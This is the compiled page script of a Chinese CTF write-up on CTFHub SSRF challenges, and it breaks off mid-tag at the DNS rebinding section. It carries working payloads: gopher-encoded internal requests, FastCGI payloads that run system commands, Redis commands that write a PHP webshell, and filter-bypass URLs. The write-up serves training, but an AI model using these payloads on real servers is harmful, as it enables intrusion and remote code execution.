(window.webpackJsonp=window.webpackJsonp||[]).push([[11],{762:function(s,t,a){"use strict";a.r(t);var e=a(1),r=Object(e.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h2",{attrs:{id:"ssrf"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ssrf"}},[s._v("#")]),s._v(" SSRF")]),s._v(" "),a("p",[a("img",{attrs:{src:"/assets/img/ctf/ssrf.png",alt:"ssrf"}})]),s._v(" "),a("h3",{attrs:{id:"内网访问"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#内网访问"}},[s._v("#")]),s._v(" 内网访问")]),s._v(" "),a("p",[s._v("直接构造访问请求,获取flag")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("/?url=127.0.0.1/flag.php\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h3",{attrs:{id:"伪协议读取文件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#伪协议读取文件"}},[s._v("#")]),s._v(" 伪协议读取文件")]),s._v(" "),a("p",[s._v("根据题目提示使用file://协议，尝试一般web目录/var/www/html/"),a("br"),s._v(" "),a("img",{attrs:{src:"/assets/img/ctf/file.png",alt:"file"}})]),s._v(" "),a("h3",{attrs:{id:"端口扫描"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#端口扫描"}},[s._v("#")]),s._v(" 端口扫描")]),s._v(" "),a("p",[s._v("提示端口范围8000到9000")]),s._v(" "),a("div",{staticClass:"language-url line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-url"}},[a("code",[a("span",{pre:!0,attrs:{class:"token path"}},[a("span",{pre:!0,attrs:{class:"token path-separator"}},[s._v("/")])]),a("span",{pre:!0,attrs:{class:"token query"}},[a("span",{pre:!0,attrs:{class:"token query-delimiter"}},[s._v("?")]),a("span",{pre:!0,attrs:{class:"token pair"}},[a("span",{pre:!0,attrs:{class:"token key"}},[s._v("url")]),s._v("="),a("span",{pre:!0,attrs:{class:"token value"}},[s._v("127.0.0.1:8000")])])]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("使用burpsuite对端口进行爆破，即可得到端口，访问获取flag")]),s._v(" "),a("h3",{attrs:{id:"post请求"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#post请求"}},[s._v("#")]),s._v(" POST请求")]),s._v(" "),a("p",[s._v("访问/?url=127.0.0.1/flag.ph,返回页面"),a("br"),s._v(" "),a("img",{attrs:{src:"/assets/img/ctf/post1.png",alt:"post1"}}),a("br"),s._v("\n包含一个form和隐藏的key，推测需要在form中提交key，F12添加提交按钮")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('<input type="submit" name="sbumit">\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/assets/img/ctf/post3.png",alt:"post3"}}),a("br"),s._v('\n在页面上提交key，页面返回"Just View From 127.0.0.1"'),a("br"),s._v(" "),a("img",{attrs:{src:"/assets/img/ctf/post5.png",alt:"post5"}}),a("br"),s._v("\n可见需要通过SSRF提交请求，构造POST请求")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("  POST /flag.php HTTP/1.1\n  Host: 127.0.0.1:80\n  Content-Type: application/x-www-form-urlencoded\n  Content-Length: 36\n\n  key=99cb8729f8a7ba5dcaa367dc092c2f2c\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[s._v("因为通过SSRF，需要进行两次请求，所以对请求数据进行2次url编码，注意使用CRLF，第一次url编码后需要将%0A替换为%0D%0A,最后得到请求数据")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("  POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D99cb8729f8a7ba5dcaa367dc092c2f2c\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("使用gopher发送请求，gopher协议是SSRF中常用的一个协议：")]),s._v(" "),a("div",{staticClass:"language-url line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-url"}},[a("code",[a("span",{pre:!0,attrs:{class:"token scheme"}},[s._v("gopher"),a("span",{pre:!0,attrs:{class:"token scheme-delimiter"}},[s._v(":")])]),a("span",{pre:!0,attrs:{class:"token authority"}},[a("span",{pre:!0,attrs:{class:"token authority-delimiter"}},[s._v("//")]),a("span",{pre:!0,attrs:{class:"token host"}},[s._v("IP")]),a("span",{pre:!0,attrs:{class:"token port-segment"}},[a("span",{pre:!0,attrs:{class:"token port-delimiter"}},[s._v(":")])])]),a("span",{pre:!0,attrs:{class:"token path"}},[s._v("port"),a("span",{pre:!0,attrs:{class:"token path-separator"}},[s._v("/")]),s._v("_")]),s._v("{TCP/IP数据流}\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("​    得到flag"),a("br"),s._v("\n​    "),a("img",{attrs:{src:"/assets/img/ctf/post4.png",alt:"post4"}})]),s._v(" "),a("h3",{attrs:{id:"文件上传"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#文件上传"}},[s._v("#")]),s._v(" 文件上传")]),s._v(" "),a("p",[s._v("使用file协议查看flag.php，代码检查了上传ip和文件大小，所以需要从127.0.0.1上传非空文件")]),s._v(" "),a("div",{staticClass:"language-php html line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("error_reporting")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_SERVER")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"REMOTE_ADDR"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"127.0.0.1"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"Just View From 127.0.0.1"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("isset")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_FILES")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"file"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_FILES")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"file"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"size"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("getenv")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"CTFHUB"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("exit")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v("\nUpload Webshell\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("<")]),s._v("form")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[s._v("action")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v('"')]),s._v("/flag.php"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v('"')])]),s._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[s._v("method")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v('"')]),s._v("post"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v('"')])]),s._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[s._v("enctype")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v('"')]),s._v("multipart/form-data"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v('"')])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(">")])]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("<")]),s._v("input")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[s._v("type")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v('"')]),s._v("file"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v('"')])]),s._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[s._v("name")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v('"')]),s._v("file"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v('"')])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(">")])]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("</")]),s._v("form")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(">")])]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br")])]),a("p",[s._v("访问"),a("code",[s._v("/?url=127.0.0.1/flag.php")]),s._v("，返回一个文件上传form，根据题意需要提交文件获取flag，F12添加提交按钮"),a("br"),s._v(" "),a("img",{attrs:{src:"/assets/img/ctf/upload1.png",alt:"upload1"}}),a("br"),s._v("\n提交一个随意非空文件，抓取上传数据包，修改host为127.0.0.1:80"),a("br"),s._v(" "),a("img",{attrs:{src:"/assets/img/ctf/upload2.png",alt:"upload2"}}),a("br"),s._v("\n对上传数据进行二次url编码，注意第一次编码后将%0A替换为%0D%0A，得到编码后的请求数据")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%2520280%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AOrigin%253A%2520http%253A%252F%252Fchallenge-426ad735267eb08d.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart%252Fform-data%253B%2520boundary%253D----WebKitFormBoundaryM9A8PenlAkNIPrWa%250D%250AUser-Agent%253A%2520Mozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F92.0.4515.159%2520Safari%252F537.36%250D%250AAccept%253A%2520text%252Fhtml%252Capplication%252Fxhtml%252Bxml%252Capplication%252Fxml%253Bq%253D0.9%252Cimage%252Favif%252Cimage%252Fwebp%252Cimage%252Fapng%252C*%252F*%253Bq%253D0.8%252Capplication%252Fsigned-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AReferer%253A%2520http%253A%252F%252Fchallenge-426ad735267eb08d.sandbox.ctfhub.com%253A10800%252F%253Furl%253D127.0.0.1%252Fflag.php%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250ACookie%253A%2520UM_distinctid%253D17b2f471020f2e-06f3628e7e7e6e-4343363-1fa400-17b2f47102110f5%250D%250AConnection%253A%2520close%250D%250A%250D%250A------WebKitFormBoundaryM9A8PenlAkNIPrWa%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522123.txt%2522%250D%250AContent-Type%253A%2520text%252Fplain%250D%250A%250D%250A123%250D%250A------WebKitFormBoundaryM9A8PenlAkNIPrWa%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522123%2522%250D%250A%250D%250A%25C3%25A6%25C2%258F%25C2%2590%25C3%25A4%25C2%25BA%25C2%25A4%250D%250A------WebKitFormBoundaryM9A8PenlAkNIPrWa--\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("使用gopher发送请求，得到flag"),a("br"),s._v(" "),a("img",{attrs:{src:"/assets/img/ctf/upload3.png",alt:"upload3"}})]),s._v(" "),a("h3",{attrs:{id:"fastcgi协议"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#fastcgi协议"}},[s._v("#")]),s._v(" FastCGI协议")]),s._v(" "),a("p",[a("a",{attrs:{href:"https://blog.csdn.net/mysteryflower/article/details/94386461",target:"_blank",rel:"noopener noreferrer"}},[s._v("fastcgi相关介绍"),a("OutboundLink")],1),a("br"),s._v(" "),a("a",{attrs:{href:"https://github.com/tarunkant/Gopherus",target:"_blank",rel:"noopener noreferrer"}},[s._v("gopher payload工具"),a("OutboundLink")],1),a("br"),s._v("\n使用gopherus工具生成payload，运行命令"),a("code",[s._v("ls /")]),a("br"),s._v(" "),a("img",{attrs:{src:"/assets/img/ctf/fastcgi1.png",alt:"fastcgi1"}}),a("br"),s._v("\n进行url编码后得到提交payload")]),s._v(" "),a("div",{staticClass:"language-url line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-url"}},[a("code",[a("span",{pre:!0,attrs:{class:"token path"}},[s._v("gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH56%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25008%2504%2500%253C%253Fphp%2520system%2528%2527ls%2520%2F%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("发送请求，获取"),a("code",[s._v("/")]),s._v("下目录情况,发现flag文件"),a("br"),s._v(" "),a("img",{attrs:{src:"/assets/img/ctf/fastcgi2.png",alt:"fastcgi2"}}),a("br"),s._v("\n使用gopherus工具生成payload，运行命令"),a("code",[s._v("cat /flag_14e0ba551d369f7992793e0b62395dc5")]),a("br"),s._v(" "),a("img",{attrs:{src:"/assets/img/ctf/fastcgi3.png",alt:"fastcgi3"}}),a("br"),s._v("\n进行url编码后得到提交payload")]),s._v(" "),a("div",{staticClass:"language-url line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-url"}},[a("code",[a("span",{pre:!0,attrs:{class:"token path"}},[s._v("gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH94%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%255E%2504%2500%253C%253Fphp%2520system%2528%2527cat%2520%2Fflag_14e0ba551d369f7992793e0b62395dc5%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("发送请求，获得flag"),a("br"),s._v(" "),a("img",{attrs:{src:"/assets/img/ctf/fastcgi4.png",alt:"fastcgi4"}})]),s._v(" "),a("h3",{attrs:{id:"redis协议"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#redis协议"}},[s._v("#")]),s._v(" Redis协议")]),s._v(" "),a("p",[a("a",{attrs:{href:"https://xz.aliyun.com/t/5665",target:"_blank",rel:"noopener noreferrer"}},[s._v("浅析Redis中SSRF的利用"),a("OutboundLink")],1),a("br"),s._v("\nredis写shell命令如下")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("flushall\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'<?php eval($_GET[\"feng\"]);?>'")]),s._v("\nconfig "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("dir")]),s._v(" /var/www/html\nconfig "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" dbfilename feng.php\nsave\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[s._v("使用gopherus工具生成redis攻击payload"),a("br"),s._v(" "),a("img",{attrs:{src:"/assets/img/ctf/redis1.png",alt:"redis1"}}),a("br"),s._v("\n进行url编码得到请求payload")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2524_GET%255B%2527cmd%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("请求后生成一句话shell.php文件，利用参数cmd，构造请求"),a("code",[s._v("/shell.php?cmd=ls%20/")]),a("br"),s._v(" "),a("img",{attrs:{src:"/assets/img/ctf/redis2.png",alt:"redis2"}}),a("br"),s._v("\n获取flag文件，再构造请求"),a("code",[s._v("/shell.php?cmd=cat%20/flag_1d41ab57dcc1507d5d99e103cdca52da")]),s._v(",获得flag"),a("br"),s._v(" "),a("img",{attrs:{src:"/assets/img/ctf/redis3.png",alt:"redis3"}})]),s._v(" "),a("h3",{attrs:{id:"url-bypasss"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#url-bypasss"}},[s._v("#")]),s._v(" URL Bypasss")]),s._v(" "),a("p",[s._v('访问地址提示"start with '),a("code",[s._v("http://notfound.ctfhub.com")]),s._v('", 所以需要以'),a("code",[s._v("http://notfound.ctfhub.com")]),s._v("开头，构造访问url如下获取flag")]),s._v(" "),a("div",{staticClass:"language-url line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-url"}},[a("code",[a("span",{pre:!0,attrs:{class:"token path"}},[a("span",{pre:!0,attrs:{class:"token path-separator"}},[s._v("/")])]),a("span",{pre:!0,attrs:{class:"token query"}},[a("span",{pre:!0,attrs:{class:"token query-delimiter"}},[s._v("?")]),a("span",{pre:!0,attrs:{class:"token pair"}},[a("span",{pre:!0,attrs:{class:"token key"}},[s._v("url")]),s._v("="),a("span",{pre:!0,attrs:{class:"token value"}},[s._v("http://notfound.ctfhub.com@127.0.0.1/flag.php")])])]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h3",{attrs:{id:"数字ip-bypass"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#数字ip-bypass"}},[s._v("#")]),s._v(" 数字IP Bypass")]),s._v(" "),a("p",[s._v("题目提示ban掉了127以及172.不能使用点分十进制的IP，但是又要访问127.0.0.1")]),s._v(" "),a("ul",[a("li",[s._v("方法一："),a("br"),s._v("\n使用localhost代替127.0.0.1,构造请求url如下，获取flag")])]),s._v(" "),a("div",{staticClass:"language-url line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-url"}},[a("code",[a("span",{pre:!0,attrs:{class:"token path"}},[a("span",{pre:!0,attrs:{class:"token path-separator"}},[s._v("/")])]),a("span",{pre:!0,attrs:{class:"token query"}},[a("span",{pre:!0,attrs:{class:"token query-delimiter"}},[s._v("?")]),a("span",{pre:!0,attrs:{class:"token pair"}},[a("span",{pre:!0,attrs:{class:"token key"}},[s._v("url")]),s._v("="),a("span",{pre:!0,attrs:{class:"token value"}},[s._v("http://localhost/flag.php")])])]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("ul",[a("li",[s._v("方法二:"),a("br"),s._v("\n将127.0.0.1转换为16进制0x7F000001,构造请求url如下，获取flag")])]),s._v(" "),a("div",{staticClass:"language-url line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-url"}},[a("code",[a("span",{pre:!0,attrs:{class:"token path"}},[a("span",{pre:!0,attrs:{class:"token path-separator"}},[s._v("/")])]),a("span",{pre:!0,attrs:{class:"token query"}},[a("span",{pre:!0,attrs:{class:"token query-delimiter"}},[s._v("?")]),a("span",{pre:!0,attrs:{class:"token pair"}},[a("span",{pre:!0,attrs:{class:"token key"}},[s._v("url")]),s._v("="),a("span",{pre:!0,attrs:{class:"token value"}},[s._v("http://0x7F000001/flag.php")])])]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h3",{attrs:{id:"_302跳转-bypass"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_302跳转-bypass"}},[s._v("#")]),s._v(" 302跳转 Bypass")]),s._v(" "),a("p",[s._v("题目提示过滤了127.0.0.1，使用"),a("a",{attrs:{href:"#%E6%95%B0%E5%AD%97ip-bypass"}},[s._v("数字IP Bypass")]),s._v("可以绕过，但是题意是使用302跳转绕过，可以生成短链接302跳转获得flag,  "),a("a",{attrs:{href:"https://my5353.com/",target:"_blank",rel:"noopener noreferrer"}},[s._v("短链接生成网站"),a("OutboundLink")],1),a("br"),s._v(" "),a("img",{attrs:{src:"/assets/img/ctf/302.png",alt:"短链接访问"}})]),s._v(" "),a("h3",{attrs:{id:"dns重绑定"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#dns重绑定"}},[s._v("#")]),s._v(" DNS重绑定")]),s._v(" "),a("p",[a("a",{attrs:{href:"https://zhuanlan.zhihu.com/p/89426041",target:"_blank",rel:"noopener 